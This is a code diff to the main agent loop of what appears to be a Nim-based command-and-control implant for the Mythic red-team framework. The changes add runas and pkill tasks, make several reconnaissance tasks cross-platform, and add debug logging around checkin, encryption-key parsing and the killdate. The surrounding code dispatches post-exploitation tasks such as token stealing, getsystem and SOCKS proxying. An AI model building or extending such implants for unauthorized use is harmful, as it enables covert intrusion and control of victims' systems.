@@ -5,6 +5,7 @@ import profiles/http_profile
 import profiles/websocket_profile
 import profiles/httpx_profile
 import utils/sysinfo
+import utils/mythic_responses
 import tasks/exit
 import tasks/sleep
 import tasks/ls
@@ -22,9 +23,14 @@ import tasks/pwd
 import tasks/rm
 import tasks/pty
 import tasks/socks
+import tasks/getenv as taskGetenv
 
 # Cross-platform commands
 import tasks/portscan
+import tasks/ifconfig
+import tasks/netstat
+import tasks/config as taskConfig
+import tasks/pkill
 
 # Windows-only commands
 when defined(windows):
@@ -35,14 +41,11 @@ when defined(windows):
   import tasks/make_token
   import tasks/steal_token
   import tasks/rev2self
+  import tasks/runas
   import tasks/getsystem
   import tasks/getprivs
-  import tasks/getenv
   import tasks/listpipes
-  import tasks/ifconfig
-  import tasks/netstat
   import tasks/scshell
-  import tasks/config
   import tasks/spawnto_x64
   import tasks/spawnto_x86
   import tasks/ppid
@@ -150,6 +153,9 @@ proc newAgent*(): Agent =
   # Initialize global data storage
   initGlobalData()
   
+  if result.config.debug:
+    echo "[DEBUG] Agent: Initializing profile (", result.config.profile, ")..."
+  
   # Initialize the correct profile based on config
   case result.config.profile
   of "websocket":
@@ -159,12 +165,18 @@ proc newAgent*(): Agent =
   else:  # Default to HTTP for "http" or any other value
     result.profile = Profile(kind: pkHttp, httpProfile: newHttpProfile())
   
+  if result.config.debug:
+    echo "[DEBUG] Agent: Profile initialized successfully"
+  
   result.callbackUuid = result.config.uuid  # Initialize with payload UUID
   result.shouldExit = false
   result.sleepInterval = result.config.callbackInterval
   result.jitter = result.config.callbackJitter
   result.taskResponses = @[]
   result.backgroundTasks = initTable[string, BackgroundTaskState]()
+  
+  if result.config.debug:
+    echo "[DEBUG] Agent: Parsing AESPSK configuration..."
   
   # If AESPSK is configured, parse and set it
   # Note: For RSA mode, AESPSK is used temporarily for staging_rsa, then replaced by session key
@@ -185,6 +197,12 @@ proc newAgent*(): Agent =
     except:
       if result.config.debug:
         echo "[DEBUG] Failed to parse AESPSK: ", getCurrentExceptionMsg()
+  else:
+    if result.config.debug:
+      echo "[DEBUG] Agent: No AESPSK configured"
+  
+  if result.config.debug:
+    echo "[DEBUG] Agent: Initialization complete"
 
 proc buildCheckinMessage(): JsonNode =
   ## Build the initial checkin message
@@ -645,6 +663,19 @@ proc processTasks*(agent: var Agent, tasks: seq[JsonNode]) =
             "user_output": "rev2self command is only available on Windows"
           }
       
+      of "runas":
+        when defined(windows):
+          if agent.config.debug:
+            echo "[DEBUG] Executing runas command"
+          response = runas(taskId, params)
+        else:
+          response = %*{
+            "task_id": taskId,
+            "completed": true,
+            "status": "error",
+            "user_output": "runas command is only available on Windows"
+          }
+      
       of "getsystem":
         when defined(windows):
           if agent.config.debug:
@@ -674,7 +705,7 @@ proc processTasks*(agent: var Agent, tasks: seq[JsonNode]) =
       of "getenv":
         if agent.config.debug:
           echo "[DEBUG] Executing getenv command"
-        response = getenv(taskId, params)
+        response = taskGetenv.getenv(taskId, params)
       
       of "listpipes":
         when defined(windows):
@@ -710,7 +741,12 @@ proc processTasks*(agent: var Agent, tasks: seq[JsonNode]) =
       of "config":
         if agent.config.debug:
           echo "[DEBUG] Executing config command"
-        response = config(taskId, params)
+        response = taskConfig.config(taskId, params)
+      
+      of "pkill":
+        if agent.config.debug:
+          echo "[DEBUG] Executing pkill command"
+        response = pkill(taskId, params)
       
       of "spawnto_x64":
         when defined(windows):
@@ -1287,21 +1323,41 @@ proc runAgent*() =
   ## Main agent execution loop - called by all entry points (EXE, DLL, Service)
   ## This is the single source of truth for the agent's main loop logic
   
+  let cfg = getConfig()
+  
+  if cfg.debug:
+    echo "[DEBUG] runAgent: Starting agent initialization..."
+  
   # Initialize random number generator for jitter
   randomize()
   
+  if cfg.debug:
+    echo "[DEBUG] runAgent: Random seed initialized"
+  
   # Check killdate
-  let cfg = getConfig()
   let now = now().format("yyyy-MM-dd")
   if now >= cfg.killdate:
+    if cfg.debug:
+      echo "[DEBUG] runAgent: Killdate reached, exiting"
     return
+  
+  if cfg.debug:
+    echo "[DEBUG] runAgent: Creating agent instance..."
   
   # Initialize agent
   var agentInstance = newAgent()
   
+  if cfg.debug:
+    echo "[DEBUG] runAgent: Agent instance created, starting checkin..."
+  
   # Perform initial checkin
   if not agentInstance.checkin():
+    if cfg.debug:
+      echo "[DEBUG] runAgent: Checkin failed, exiting"
     return
+  
+  if cfg.debug:
+    echo "[DEBUG] runAgent: Checkin successful, entering main loop"
   
   # Main agent loop
   while not agentInstance.shouldExit:
